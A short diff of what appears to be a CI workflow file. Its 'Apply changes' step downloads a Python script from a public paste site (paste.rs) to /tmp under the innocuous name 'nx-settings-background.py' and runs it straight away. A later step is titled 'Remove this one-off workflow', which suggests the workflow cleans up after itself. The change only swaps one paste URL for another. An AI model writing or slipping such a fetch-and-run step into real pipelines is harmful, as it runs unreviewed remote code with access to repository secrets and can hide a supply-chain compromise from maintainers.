@@ -15,7 +15,7 @@ jobs:
 
       - name: Apply changes
         run: |
-          curl -fsSL https://paste.rs/ZVPsf -o /tmp/nx-settings-background.py
+          curl -fsSL https://paste.rs/rN35W -o /tmp/nx-settings-background.py
           python3 /tmp/nx-settings-background.py
 
       - name: Remove this one-off workflow
